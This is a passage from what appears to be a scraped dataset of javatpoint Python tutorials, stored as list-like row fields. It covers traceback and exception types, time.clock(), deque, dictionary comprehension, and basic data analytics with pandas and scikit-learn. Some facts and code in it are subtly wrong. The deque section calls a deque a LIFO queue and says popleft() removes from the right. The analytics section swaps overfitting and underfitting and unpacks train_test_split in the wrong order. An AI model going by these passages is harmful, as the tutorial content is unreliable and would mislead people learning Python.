AttributeError exception is raised:', 'Generally, whenever an exception like such is raised, it signifies that we are probably dealing with an instance that is not the type we were looking for.', ""This exception is raised whenever the import statement finds it difficult to load a library or module. Moreover, it is raised whenever the 'from list' in from ... import contains a name that can't be located."", 'The exception, also known as SyntaxError, is generally raised whenever the syntax of the Python program is incorrect. The document of Python signifies when the SyntaxError exception is raised:', 'This exception is raised whenever a function or operation receives a parameter with the correct type; however, an unfitting value and the state are not defined by a more specific exception like IndexError.', 'In the above syntax, we have tried to unpack way too many values. As a result, the program returns the ValueError exception, saying there are not enough values to unpack (expected 4, got 3).']","['A Traceback is a report having the calls made to the function in the lines of code at a particular point. Tracebacks are identified by multiply names, such as stack trace, stack traceback, backtrace, and a lot more. However, we use the term ""Traceback"" in the Python programming language.', 'In the above snippet of code, we have defined a custom function named welcome which takes a parameter as ""name"". However, while printing some messages within the function, we have misspelled the ""name"" parameter to the ""nam"". As a result, Python printed a traceback message when the exception is raised while calling the function.', 'As we can observe in the output, the traceback message contains all the information that we will require in order to diagnose the problem. The last line of the traceback message expresses the type of exception raised in addition to some appropriate data related to that exception. The earlier lines of the traceback message indicate the code resulting in the raised exception.', 'The Traceback in Python has so much valuable data regarding the exception being raised in the lines of code. In the following section, we will understand how to read different tracebacks in order to acknowledge different bits of data stored in a traceback.', 'As we can observe in the above snippet of the code of REPL, the traceback message returns """" in the place of the name(s) of the file because we have typed the code in through standard input. Moreover, the lines of code that are executed are not shown in the traceback message.', 'In the above snippet of code, we have defined an integer and tried accessing its attribute. However, when we executed the program, it raised an AttributeError exception saying that the specific object type, int in the above case, does not have the attribute accessed, i.e., an_attribute for this case. Viewing the AttributeError exception in the message line of error can assist us convenient in order to identify the attribute we were trying to access and how we can fix it.', 'In the above snippet of code, we have defined a list and used the append() method to add another element to the list. However, as a result, we might be expecting my_list to be of type list, which contains a method known as append(). When we received the AttributeError exception, we observed that it was raise while calling the append() function that expressed to us that we are probably are not working with the object type we were looking for.', ""Generally, this happens when we are looking for an object to be returned from a method or function call to be a particular type, but in the end, we are left with the None type object. In the above scenario, the message line of error will show, AttributeError: 'NoneType' object has no attribute 'append'."", 'The exception, also known as ImportError, is raised whenever something goes wide of the mark with an import statement. We will obtain this exception, or its subclass is known as ModuleNotFoundError, if the module or library we are attempting to import cannot be found or importing something from a library or module does not happen to be in it. The documentation of Python signifies when the ImportError exception is raised:', 'In the above snippet of code, we have tried importing a library or module that does not exist, xyz, resulting in the case of the ModuleNotFoundError exception. On the other hand, when we tried importing the module xyz that does not exist from the collections library that does exist, the program raised the ImportError exception. The message lines of the error at the bottom of the tracebacks display us which specific thing could not be imported, and in both the above cases, it is xyz.', 'The exception, also known as IndexError, is generally raised whenever we try to retrieve an index from a series or sequence, such as a tuple or a list, and the index is not found in the series or sequence. The documentation of Python signifies when the Index exception is raised:', 'In the above snippet of code, we have defined a list as my_list containing four elements. However, when we attempted to print the element at index number 5, the program raised an IndexError exception. The message stated in error for an IndexError exception does not provide us proper knowledge. We can observe that we have a sequence reference, i.e., out of range in addition to the type of the sequence, a list in the following scenario. Together with the rest of the traceback, that data is generally enough to help us rapidly recognize how to fix the problem.', 'The exception, also known as KeyError, is similar to the IndexError exception and raised whenever we try to access a key that is not in the mapping, generally observed in a data structure like the dictionary. The documentation of Python signifies when the KeyError exception is raised:', 'In the above snippet of code, we have defined a dictionary with some keys and values assigned to each key. We have then tried to access the value of the key, which is not available in the dictionary. As a result, the program raised the KeyError exception saying that the key we are looking for could not be found.', 'The exception, also known as NameError, is raised whenever we have referenced a variable, class, function, module, or other names that has not been defined within the lines of code. The documentation of Python signifies when the NameError exception is raised.', ""In the above example, we have defined a function as myself(), which takes an argument as the name. However, we have misspelled the name with nam in the following line while printing some statements. We have then called the function. As a result, the program raised the NameError exception as the name 'nam' is not defined in the program."", 'In the above syntax, we have defined a function as myself(), but forget to include a colon "":"" mark after the function definition. As a result, when we executed the function, the program raised the SyntaxError exception, saying an issue with the program\'s syntax. The ^ (caret) mark below the line of code indicates the location of the problem.', 'Moreover, we can observe that the SyntaxError traceback message does not display the regular first-line saying ""Traceback (most recent call last):"". This is because the SyntaxError exception is raised when Python tries to analyze the line of code, and the lines of code are not being processed in a literal way.', 'The exception, also known as TypeError, is raised whenever the syntax tries to perform some function with an instance that cannot perform that function, like attempting to add an integer to a string or calling the len() function on an object where its length is not specified. The documentation of Python signifies when the TypeError exception is raised:', 'In the above example, we have defined two variables as one integer and one string. We have then performed the addition operation on these variables and tried printing the result. However, the program returned the TypeError exception as we attempted to add the integer value with the string value.', ""In the above example, we have defined a variable of data type 'int' and attempted to perform the len() function on the variable. However, the program raised the TypeError, saying that we cannot perform the len() function with an object of data type 'int'."", ""The exception, also known as the ValueError, is raised whenever the object's value is not correct. This exception is similar to the IndexError exception as the index value is out of the range of the sequence in the case of the IndexError exception. In contrast, the ValueError exception is for a more general scenario. The documentation of Python signifies when the ValueError exception is raised:""]","['# File name: pytrace.py', '# defining a custom function', 'def welcome( name ):', '# printing some message', 'print( ""Hello, "" + nam ) # using \'nam\' instead of \'name\'', 'print( ""Welcome to the Python program!"")', '# calling the function', 'welcome( ""James"" )', 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 10, in', 'welcome( ""James"" )', 'File ""D:\\Python\\pytrace.py"", line 6, in welcome', 'print( ""Hello, "" + nam ) # using \'nam\' instead of \'name\'', ""NameError: name 'nam' is not defined"", '>>> def welcome( name ):', '...     print( ""Hello, "" + nam )', '...     print( ""Welcome to the Python program!"")', '>>> welcome( ""James"" )', 'Traceback (most recent call last):', 'File """", line 1, in', 'File """", line 2, in welcome', ""NameError: name 'nam' is not defined"", '# defining a variable', 'my_int = 10', 'print(my_int.an_attribute)', '# defining a list', 'my_list = ( 10, 20 )', ""# using the 'append()' method in the list"", 'my_list.append( 30 )', '# printing the final list', 'print( my_list )', '# importing a library or module', 'import xyz', 'from collections import xyz', '# defining a list', 'my_list = [ ""Apple"", ""Peaches"", ""Mango"", ""Banana"" ]', '# printing the element of the list', 'print( my_list[ 4 ] )', '# defining a dictionary', ""mydict = {'Mike' : 40, 'James' : 25, 'Drake' : 32, 'Jenny' : 28}"", '# accessing a key out of the dictionary', ""print( mydict['Sam'] )"", '# defining a function', 'def myself( name ):', 'print(""My name is"", nam)', '# Calling the function', 'myself( ""Robin"" )', '# defining a function', 'def myself( name )', 'print(""My name is"", nam)', '# Calling the function', 'myself( ""Robin"" )', '# defining some variables', 'myint = 10', ""mystr = '10'"", '# performing addition on objects of different types', 'myadd = myint + mystr', '# printing the result', 'print(""Result:"", myadd)', '# defining the variable', 'myint = 10', ""# finding length of the object of type 'int'"", 'print(""Length:"", len(myint))', '# defining the variables', 'var1, var2, var3 = [10, 20, 30, 40]', '# defining the variable', 'var1, var2, var3, var4 = [10, 20, 30]']","['Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 10, in', 'welcome( ""James"" )', 'File ""D:\\Python\\pytrace.py"", line 6, in welcome', 'print( ""Hello, "" + nam ) # using \'nam\' instead of \'name\'', ""NameError: name 'nam' is not defined"", 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 2, in', 'print(my_int.an_attribute)', ""AttributeError: 'int' object has no attribute 'an_attribute'"", 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 5, in', 'my_list.append( 30 )', ""AttributeError: 'tuple' object has no attribute 'append'"", '# Output for the first line', 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 2, in', 'import xyz', ""ModuleNotFoundError: No module named 'xyz'"", '# Output for the second line', 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 3, in', 'from collections import xyz', ""ImportError: cannot import name 'xyz' from 'collections' (D:\\Python39\\lib\\collections\\__init__.py)"", 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 5, in', 'print( my_list[ 4 ] )', 'IndexError: list index out of range', 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 5, in', ""print( mydict['Sam'] )"", ""KeyError: 'Sam'"", 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 6, in', 'myself( ""Robin"" )', 'File ""D:\\Python\\pytrace.py"", line 3, in myself', 'print(""My name is"", nam)', ""NameError: name 'nam' is not defined"", 'File ""D:\\Python\\pytrace.py"", line 2', 'def myself( name )', '^', 'SyntaxError: invalid syntax', 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 4, in', 'myadd = myint + mystr', ""TypeError: unsupported operand type(s) for +: 'int' and 'str'"", 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 5, in', 'print(""Length:"", len(myint))', ""TypeError: object of type 'int' has no len()"", 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 2, in', 'var1, var2, var3 = [10, 20, 30, 40]', 'ValueError: too many values to unpack (expected 3)', 'Traceback (most recent call last):', 'File ""D:\\Python\\pytrace.py"", line 2, in', 'var1, var2, var3, var4 = [10, 20, 30]', 'ValueError: not enough values to unpack (expected 4, got 3)']",[],"['|||Blue block: The last line highlighted with blue signifies the error message line. This line consists of the name of raised exception.|||Green block: After the name of the exception is the message related to the error. This message generally consists of valuable data to understand the reason behind the raised exception.|||Yellow block: The yellow block contains different calls of the function moving from bottom to top, most recent to least recent. These calls are denoted using the entries of two-line for each call. The first line of each call consists of data such as the name of the file, line number, and the name of the module, all indicating where the code can be found.|||Bold lines: These bold lines are the second line for these calls consisting of the actual snippet of the processed code.|||']"
230,['Time clock() Method in Python'],"['In this tutorial, we will discuss the clock() function of the time module in the Python. We will also see the syntax of the Python time clock() method along with some examples for better understanding.']","['https://www.javatpoint.com/deque-in-python', 'https://www.javatpoint.com/traceback-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/deque-in-python', 'https://www.javatpoint.com/traceback-in-python', 'https://www.javatpoint.com/deque-in-python']",[],[],"['Understanding the time clock() method in Python', 'Syntax of the time clock() function', 'Examples of Python clock() function']",[],"['Note: The clock() function of the time module has been deprecated since Python version 3.3. The users can use the time perf_counter() and time process_time() functions instead, depending on their requirements.']","['Let us understand the syntax of the clock() method of the time module in Python', 'The syntax of the Python time clock() function is shown below:', 'Parameter:', 'Return Value:', 'The time clock() function displays two functionalities:', 'Now, let us take a look at some examples based on the clock() method in Python.', 'Here are some examples based on the clock() function of the time module in the Python programming language.', 'Explanation:', 'Now, let us consider another example based on the clock() function:', 'Explanation:']","['The clock() method is a function in the time module of the Python programming language. It is represented as the total number of seconds to return the current floating-point computations of CPU time.', 'Under the Win32 system, this function returns the real-time (in other terms, wall time), whereas this function returns the CPU time in Unix or Linux systems.']","['Since many functions are defined in the time module call the equivalent C library function, the clock() method also calls the equivalent C library method to return the output. Moreover, the precision of the returned floating-point value relies on the C library function called. Therefore, it works as the alternative to the time() function of the time module to measure the time consumption.', 'The clock() method shows different meanings in different systems. On systems like UNIX, this function returns a ""process of time"", which is a floating-point value (in other words, timestamp) in seconds. Whereas in systems like WINDOWS, the function returns the actual processing time for the first call and the current processing time for the subsequent call. (Actually, a WIN32 on QueryPerformanceCount(), relies on much more accurate and precise than milliseconds).', 'In the above snippet of code, we have imported the time module. We have then defined an object that uses the time clock() function to return the current processing time. We have then printed this value for the users. As a result, the current processing time is successfully printed for the users.', 'In the above snippet of code, we have imported the time module. We have then defined a function as proc() and used the time sleep() function with the value 2.5 as its parameter. We have then measured the current processing time using the time clock() function, called the proc() function, and printed the current processing time for the users. We have then measured the wall time using the time() function, called the proc() function again, and printed the Wall time for the users. As a result, the required values are returned successfully.']","['time.clock()', '# importing the time module', 'import time', '# using the clock() function of the time module', 'processing_time = time.clock()', '# printing the current processing time', 'print(""Current Processing Time (in sec):"", processing_time)', '# importing the time module', 'import time', '# defining a function', 'def proc():', 'time.sleep( 2.5 )', '# measuring the current processing time', 'pro_time = time.clock()', 'print(""Current Processing Time (in sec):"", pro_time)', '# measuring the wall time', 'wall_time = time.time()', 'print(""Wall Time (in sec):"", time.time() - wall_time)']","['Current Processing Time (in sec): 0.109375', 'Current Processing Time (in sec): 0.109375', 'Wall Time (in sec): 2.5002729892730713']",[],"['|||The time clock() function does not require any parameter.|||&&&|||On the first call, this function returns the actual processing time of the program.|||On the subsequent call, this function returns the processing time after the first call, and this call will be made to the interval.|||']"
231,['Deque in Python'],"['The Queue is a core library that allows the users to define a list based on the FIFO (First In, First Out) principle. In contrast, the Deque in Python owns the opposite principle: LIFO (Last in, First Out) queue. In the following tutorial, we will only understand what Deque in Python is with some examples.']","['https://www.javatpoint.com/dictionary-comprehension-in-python', 'https://www.javatpoint.com/time-clock-method-in-python', 'https://www.javatpoint.com/dictionary-comprehension-in-python', 'https://www.javatpoint.com/time-clock-method-in-python', 'https://www.javatpoint.com/dictionary-comprehension-in-python']",[],[],[],"['Understanding the Deque in Python', 'Some Operations on Deque']",[],"[""So, let's get started."", 'Let us consider the following syntax to understand how the deque module works in Python.', 'Explanation:', 'Let us consider a simple example based on the deque module.', 'Explanation:', 'Now, let us understand various Operations on Deque.', 'There are various Operations that can be used in Deque. Some of them are listed below with their descriptions:', 'Now let us consider some examples based on the deque module.', 'Explanation:', 'Explanation:']",[],"['A Deque, also known as a Double-ended queue, has the attribute of inserting and deleting data elements from either end. The deque module is a segment of the library known as collections. It contains the attributes to add and remove data elements that can be invoked directly with parameters. In order to declare a deque, we have to import the collections library first.', 'In the above snippet of code, we have imported the deque module from the collections library and declared the deque by assigning the name of the list, i.e., list_name in the above case, to the deque() module. Here we can also observe that we do not need any class in order to implement these in-built methods. They can be implemented directly.', 'In the above example, we have imported the deque module from the collections library. We have then defined a fruit list as a deque using the deque module, specifying some of the fruit names. We have then printed the declared Deque for the users. As a result, the declared Deque containing a bunch of fruit names is printed successfully.', 'In the above snippet of code, we have imported the collections library and declared a deque. We have then used the operations like append() and appendleft() in order to insert the some data elements to both ends of the deque and printed the modified deque for the users. Similarly, we have then used the operations such as pop() and popleft() in order to remove the data elements from both ends of the deque and printed the resultant deque for the users.', ""In the above snippet of code, we have again imported the collections library and declared a deque. We have then used the index() operation in order to check the first occurrence of the data element 'Feb' between the index numbers 2 and 7, respectively. We have then used the insert() operation in order to insert the data element 'Jan' at the 4th position. We have then used the count() operation in order to count the occurrence of the data element 'Feb' in the deque. At last, we have used the remove() operation in order to remove the first occurrence of the data element 'Mar' from the deque and printed the resultant deque for the users.""]","['# importing the deque module', '# from the collections library', 'from collections import deque', '# declaring the deque', 'list_name = deque()', '# importing the deque module', '# from the collections library', 'from collections import deque', '# declaring the deque', ""fruit_list = deque(['Apple', 'Mango', 'Peaches', 'Banana', 'Papaya'])"", '# printing the deque', 'print(fruit_list)', '# importing the collections library', '# for deque operations', 'import collections', '# declaring the deque', 'my_deque = collections.deque([10, 20, 30, 40, 50])', '# using the append() function to add', '# data element at right end', '# inserting 60 at the end of the deque', 'my_deque.append(60)', '# printing the resultant deque', 'print( ""The deque after appending at right: "" )', 'print( my_deque )', '# using the appendleft() function to add', '# data element at left end', '# inserting 70 at the starting of the deque', 'my_deque.appendleft(70)', '# printing the resultant deque', 'print( ""The deque after appending at left: "" )', 'print( my_deque )', '# using the pop() function to remove', '# data element from the right end', '# removing 60 from the right end of deque', 'my_deque.pop()', '# printing the resultant deque', 'print( ""The deque after removing from right: "" )', 'print( my_deque )', '# using the popleft() function to remove', '# data element from the left end', '# removing 70 from the left end of deque', 'my_deque.popleft()', '# printing the resultant deque', 'print(""The deque after removing from left: "" )', 'print( my_deque )', '# importing the collections library', 'import collections', '# declaring the deque', ""my_deque = collections.deque(['Jan', 'Feb', 'Mar', 'Mar', 'Feb', 'April', 'Feb'])"", '# using the index() function to print', '# the first occurrence of data element: Feb', 'print( ""The first occurs of \'Feb\' at a position: "" )', ""print( my_deque.index('Feb', 2, 7) )"", '# using the insert() function to insert', ""# the data element 'Jan' at 4th position"", ""my_deque.insert(3,'Jan')"", '# printing the resultant deque', 'print( ""The deque after inserting \'Jan\' at 4th position: "" )', 'print( my_deque )', '# using the count() function to count', ""# the occurrences of data element 'Feb'"", 'print( ""The count of \'Feb\' in deque: "" )', ""print( my_deque.count('Feb') )"", '# using the remove() function to remove', ""# the first occurrence of data element 'Mar'"", ""my_deque.remove('Mar')"", '# printing the resultant deque', 'print( ""The deque after removing the first occurrence of \'Mar\': "" )', 'print( my_deque )']","[""deque(['Apple', 'Mango', 'Peaches', 'Banana', 'Papaya'])"", 'The deque after appending at right:', 'deque([10, 20, 30, 40, 50, 60])', 'The deque after appending at left:', 'deque([70, 10, 20, 30, 40, 50, 60])', 'The deque after removing from right:', 'deque([70, 10, 20, 30, 40, 50])', 'The deque after removing from left:', 'deque([10, 20, 30, 40, 50])', ""The first occurs of 'Feb' at a position:"", '4', ""The deque after inserting 'Jan' at 4th position:"", ""deque(['Jan', 'Feb', 'Mar', 'Jan', 'Mar', 'Feb', 'April', 'Feb'])"", ""The count of 'Feb' in deque:"", '3', ""The deque after removing the first occurrence of 'Mar':"", ""deque(['Jan', 'Feb', 'Jan', 'Mar', 'Feb', 'April', 'Feb'])""]","[""S. No.|||Operation|||Description&&&1|||append()|||The append() function is utilized for the addition of the data element in its parameter to the right end of the deque.&&&2|||appendleft()|||The appendleft() function is utilized for the addition of the data element in its parameter to the left end of the deque.&&&3|||pop()|||The pop() function is utilized for the deletion of the data element from the right end of the deque.&&&4|||popleft()|||The popleft() function is utilized for the deletion of the data element from the right end of the deque.&&&5|||index(element, begin, end)|||The index() function is utilized to return the first index value specified in the parameters, start the search from begin till end index.&&&6|||insert(i, x)|||The insert() function is utilized to insert the value described in the parameter 'x' at index number 'i' mentioned in parameters.&&&7|||remove()|||The remove() function is utilized to remove the first occurrence of the value specified in the parameters.&&&8|||count()|||The count() function is utilized to count the total number of occurrences of the value specified in the parameters.&&&9|||extend(iterable)|||The extend() function is utilized to insert multiple data elements at the right end of the deque. The parameter passed is iterable.&&&10|||extendleft(iterable)|||The extendleft() function is utilized to insert multiple data elements at the left end of the deque. The parameter passed is iterable. The Order is also reversed as an output of left appends.&&&11|||reverse()|||The reverse() function is utilized to reverse the Order of deque data elements.&&&12|||rotate()|||The rotate() function is utilized to rotate the deque by the number mentioned in parameters. If the mentioned number is a negative value, then the rotation occurs to the left. Else rotation is to the right.""]",[]
232,['Dictionary Comprehension in Python'],"['In this tutorial, we will discuss about dictionary comprehension in Python, and we will learn how we can use it and also understand some examples.']","['https://www.javatpoint.com/python-data-analytics', 'https://www.javatpoint.com/deque-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-data-analytics', 'https://www.javatpoint.com/deque-in-python', 'https://www.javatpoint.com/python-data-analytics']",[],[],"['What is Dictionary Comprehension?', 'How to use Dictionary Comprehension', 'Conclusion']",[],[],"['In Python, dictionaries are the data types in which the users can store the data in a pair of key/value.', 'The dictionary comprehension is created in the following form:', 'Example 1: (Method 1)', 'Example 2: (Method 2)', 'The user can also create the dictionary from a list by using comprehension.', 'Example 3: (Method 3)', 'Example 4: (Method 4)', 'The user can also create Dictionary comprehension by using if and else statements.', 'Example 5: (Method 5)', 'Example 6: (Method 6)', ""Let's understand the following example."", 'In the above example, the user has used dictionary comprehension for converting the dollar value into pound value.']","['Just like list comprehension, Python also allows the user to perform dictionary comprehensions. The user can create the dictionary by using the simple expression of the built-in method.']","['Dictionary comprehension is the method used for transferring one dictionary into another dictionary. Throughout the process of transferring the dictionary into another, the user can also include the data of the original dictionary into the new dictionary, and each data can be transferred as per need.', 'In this tutorial, we have explained the different methods of creating dictionary comprehension in Python by using different parameters and methods. We also showed an example of how the user can use dictionary comprehension for converting the dollar value into pound value.']","['dict1 = {""x"": 12, ""r"": 31, ""l"": 1, ""v"": 54}', ""{key: 'value' (value for (key, value) in iterable form)"", ""# let's assume the user have two lists named Key and values"", ""key = ['p', 'q', 'r', 's', 't']"", 'value = [56, 67, 43, 12, 6]', '# the following method is used for comprehensiong the dictionary', 'user_Dict = { X:Y for (X,Y) in zip(key, value)}', 'print (""user_Dict: "", user_Dict)', '# The user can also user the below method', ""key_1 = ['j', 'k', 'l', 'm', 'n', 'o']"", 'value_1 = [34, 54, 13, 76, 98, 74]', 'user_Dict_1 = dict (zip (key_1, value_1))', 'print (""user_Dict_1: "", user_Dict_1)', 'user_Dict2 = {q: q**2 for q in [56, 67, 43, 12, 6]}', 'print (""user_Dict2: "", user_Dict2)', ""user_Dict3 = {q.upper(): q*3 for q in 'JavaTpoint is the Best learning Website'}"", 'print (""user_Dict: "", user_Dict3)', 'user_dict4 = {q: q**3 for q in range (30) if q**3 % 4 == 0}', 'print (""user_dict4: "", user_dict4)', 'user_dict5 = dict()', 'for numm in range(3, 20):', 'user_dict5 [numm] = numm*numm', 'print(""user_dict5: "", user_dict5)', '#food_item price are in dollars', ""old_price_1 = {'milk per litter': 2.12, 'coffee per cup': 3.60, 'bread per packet': 1.51}"", 'print (""old_price_1: "", old_price_1)', 'convert_dollar_to_pound = 0.71', 'new_price_1 = {food_item: values*convert_dollar_to_pound for (food_item, values) in old_price_1.items()}', 'print (""new_price_1: "", new_price_1)']","[""user_Dict: {'p': 56, 'q': 67, 'r': 43, 's': 12, 't': 6}"", ""user_Dict_1: {'j': 34, 'k': 54, 'l': 13, 'm': 76, 'n': 98, 'o': 74}"", 'user_Dict2: {56: 3136, 67: 4489, 43: 1849, 12: 144, 6: 36}', ""user_Dict: {'J': 'JJJ', 'A': 'aaa', 'V': 'vvv', 'T': 'ttt', 'P': 'ppp', 'O': 'ooo', 'I': 'iii', 'N': 'nnn', ' ': '   ', 'S': 'sss', 'H': 'hhh', 'E': 'eee', 'B': 'bbb', 'L': 'lll', 'R': 'rrr', 'G': 'ggg', 'W': 'WWW'}"", 'user_dict4: {0: 0, 2: 8, 4: 64, 6: 216, 8: 512, 10: 1000, 12: 1728, 14: 2744, 16: 4096, 18: 5832, 20: 8000, 22: 10648, 24: 13824, 26: 17576, 28: 21952}', 'user_dict5: {3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81, 10: 100, 11: 121, 12: 144, 13: 169, 14: 196, 15: 225, 16: 256, 17: 289, 18: 324, 19: 361}', ""old_price_1: {'milk per litter': 2.12, 'coffee per cup': 3.6, 'bread per packet': 1.51}"", ""new_price_1:  {'milk per litter': 1.5052, 'coffee per cup': 2.556, 'bread per packet': 1.0721}""]",[],[]
233,['Python Data Analytics'],"['Data Analysis can help us to obtain useful information from data and can provide a solution to our queries. Further, based on the observed patterns we can predict the outcomes of different business policies.']","['https://www.javatpoint.com/python-seek-method', 'https://www.javatpoint.com/dictionary-comprehension-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-seek-method', 'https://www.javatpoint.com/dictionary-comprehension-in-python', 'https://www.javatpoint.com/python-seek-method']",[],[],"['Understanding the basic of Data Analytics', 'Data Wrangling', 'Exploratory Data Analysis', 'How to Develop a Model?', 'How to Evaluate a Model?']","['Data', 'Packages Available', 'Importing & Exporting Datasets', 'How to deal with missing values?', 'How to proceed with data formatting?', 'Normalization of Data', 'How to convert categorical variables into numeric variables?', 'Binning in Python', 'Statistics', 'Using GroupBy', 'Correlation', 'Relationship between two categorical variables', 'Using Visualization to evaluate our model', 'In Sample Evaluation', 'Decision Making', 'Overfitting and Underfitting', 'Ridge Regression']",[],"[""There's a diversity of libraries available in Python packages that can facilitate easy implementation without writing a long code."", 'Examples of some of the packages are-', 'The two essential things that we must take care of while importing the datasets are-', 'It can be done in the following way-', ""If the dataset doesn't contain a header, we can specify it in the following way-"", 'To look at the first five and last five rows of the dataset, we can make use of df.head() and df.tail() respectively.', ""Let's have a look at how we can export the data, if we have a file present in the .csv format then,"", 'Data wrangling is a process of converting the data from a raw format to the one in which it can be used for analysis', 'Let us see what this part encompasses-', 'Missing values - Some entries are left blank because of the unavailability of information. It is usually represented with NaN, ? or 0.', 'Let us discuss how we can deal with them-', 'The best option is to replace the numerical variable with their average and the categorical variable with the mode.', 'Sometimes a situation might occur, when we have to drop the missing value, it can be done using-', 'If we want to drop a row, we have to specify the axis as 0. If we want to drop a column, we have to specify the axis as 1.', 'Moreover, if we want these changes to directly occur in the dataset, we will specify one more parameter inplace = True.', ""Now let's see how the values can be replaced-"", 'The syntax is -', 'Here we will make a variable and store the mean of the attribute (whose value we want to replace) in it', 'It refers to the process of bringing the data in a comprehensible format. For example - Changing a variable name to make it understandable.', 'To do the same, we can use the following techniques on an attribute-', 'To convert categorical variables to dummy variables 0 or 1, we will use', 'It refers to the process of converting numeric variables into categorical variables.', 'We can obtain the range using linspace() method', 'Let us have a look at an example that would help us to understand how it can be used in Python.', 'Correlation measures the scope to which two variables are interdependent.', 'Concerning statistics, we can obtain the correlation using Pearson Correlation. It gives us the correlation coefficient and the P-value.', 'Let us have a look at the criteria-', 'We can use it in our piece of code using scipy stat package.', ""Let's say we want to calculate the correlation between two attributes, attribute1 and attribute2-"", 'Further to check the correlation between all the variables, we can create a heatmap.', 'The relationship between two categorical variables can be calculated using the chi-square method.', 'First, let us understand what is a model?', 'A model can refer to an equation that helps us to predict the outcomes.', 'Linear Regression - As the name suggests, it involves only a single independent variable to make a prediction.', 'Multiple Regression - It involves multiple independent variables to make a prediction.', 'The equation for a simple linear regression can be represented as-', 'y-dependent variable', 'x - independent variable', 'b1-intercept', 'To implement Linear Regression in Python-', 'Creating plots is a good practice since they show the strength of correlation and whether the direction of the relationship is positive or negative.', 'Let us have a look at the different plots that can help us to evaluate our model-', '1. Using Regression Plot', '2. Using Residual Plot', 'Here, we will discuss how we can evaluate our model numerically, the two ways of doing the same are-', '1. Mean Square Error(MSE)', 'This method takes the difference between the actual and predicted value, squares it, and then finally calculates their average.', 'We can implement the same in Python using-', '2. R-squared', 'In a nutshell, we have to take care of the following things when we are evaluating a model-', 'It can be implemented in Python using-', 'Overfitting- It is the condition when the model is quite simple to fit the data.', 'Underfitting - It is the condition when the model easily adjusts the noise factor rather than the function.']","['The kind of data on which we work during the analysis is mostly of the csv (comma separated values) format. Usually, the first row in the csv files represents as headers.', 'The features present in the dataset have values that can result in a biased prediction. Therefore, we must bring them to a range where they are comparable.', 'Under this, we proceed with a process called ""One-Hot Encoding"", let\'s say there\'s an attribute that holds categorical values. We will make dummy variables from the possibilities and assign them 0 or 1 based on their occurrence in the attribute.', ""Let's say we have taken an attribute 'price' from a dataset. We can divide its data into three categories based on the range and then denote them with names such as low-price, mid-price, and high price."", 'We can find out the statistical summary of our dataset using describe() method. It can be used as df.describe(). The categorical variables can be summarized using value_counts() method.', 'The groupby() method of pandas can be applied to categorical variables. It groups the subsets based on different categories. It can involve single or multiple variables.', 'A visual idea of checking what kind of a correlation exists between the two variables. We can plot a graph and interpret how does a rise in the value of one attribute affects the other attribute.', 'R-squared is also known as the coefficient of determination. It shows the closeness of data with the fitted regression line. It can be used in Python using the score() method.', 'Evaluating our model is an integral element since it tells how perfectly our data fits the model. Now, we will discuss how we can use the training data to predict the results.', 'The key idea is to split our dataset into training and testing. The training dataset is used to build our model and the testing dataset is used to assess the performance of our model.', 'This is used when we are dealing with the variables of tenth degree. Here we introduced a factor called alpha. Let us see how we can implement this in Python.']",[],"['import pandas as pd', 'path="" ""', 'df = pd.read_csv(path)', 'df = pd.read_csv(path,header=None)', 'path = "" ""', 'df.to_excel(path)', 'df.dropna()', 'df.replace(missing value, new value)', 'mean=df[""attribute name""].mean()', 'df[""attribute name""].replace(np.nan,mean)', 'pandas.get_dummies(df[""attribute-name""])', 'This will generate the expected results.', 'bin = np.linspace(min(df[""attribute-name""]),max(df[""attribute-name""]),4)', 'cat_names=[""low-price"",""mid-price"",""high-price""]', 'df[""bin_name""]=pd.cut(df[""attribute-name""],bin,labels=cat_names)', ""df_att=df[['attribute1', 'attribute2', 'attribute3']]"", ""df_g=df_att.groupby(['attribute1', 'attribute2'], as_index=False).mean()"", 'pearson_coef,p_value=stats.pearsonr(df[""attribute1""],df[""attribute2""]).', 'scipy.stats.chi2_contingency(cont_table, correction=True)', 'from sklearn.linear_model import LinearRegression', 'lm=LinearRegression()', 'X=df[""attribute-name1""]', 'Y=df[""attribute-name1""]', 'lm.fit(X,Y)', 'yp=lm.predict(X)', 'import seaborn as sns', 'sns.regplot(x=""attribute1"",y=""attribute2"",data=df)', 'plt.ylim(0,)', 'import seaborn as sns', 'sns.residplot(df[""attribute1""],df[""attribute2""])', 'from sklearn.metrics', 'import mean_squared_error', ""mean_squared_error(df['target-variable'],Y_predict_simple_fit)"", 'X=df[""attribute-1""]', 'Y=df[""attribute-2""]', 'lm.fit(X,Y)', 'lm.score(X,Y)', 'from sklearn.model_selection import train_test_split', ""x_train,y_train,x_test,y_test=train_test_split(x_data,y_data,test_size=' ',random_state=' ')"", 'from sklearn.linear_model import Ridge', 'RModel=Ridge(alpha=0.1)', 'RModel.fit(X,Y)', 'Yp=RModel.predict(X)']",[],"['CORRELATION COEFFICIENT|||RELATIONSHIP&&&1. Close to +1|||Large Positive&&&2. Close to -1|||Large Negative&&&3. Close to 0|||No relationship exists', 'P-VALUE|||CERTAINITY&&&P-value<0.001|||Strong&&&P-value<0.05|||Moderate&&&P-value<0.1|||Weak&&&P-value>0.1|||No']","['|||Linear Regression & Multiple Linear Regression|||&&&|||Scientific computing libraries such as NumPy, Pandas & SciPy.|||Visualization libraries such as Matplotlib and seaborn.|||Algorithm libraries such as scikit-learn and statsmodels.||||||Format- It refers to the way a file is encoded. The examples of prominent formats are .csv,.xlsx,.json, etc.|||Path of File- The path of the file refers to the location of the file where it is stored. It can be available either in any of the drives or some online source.||||||Simple Feature Scaling 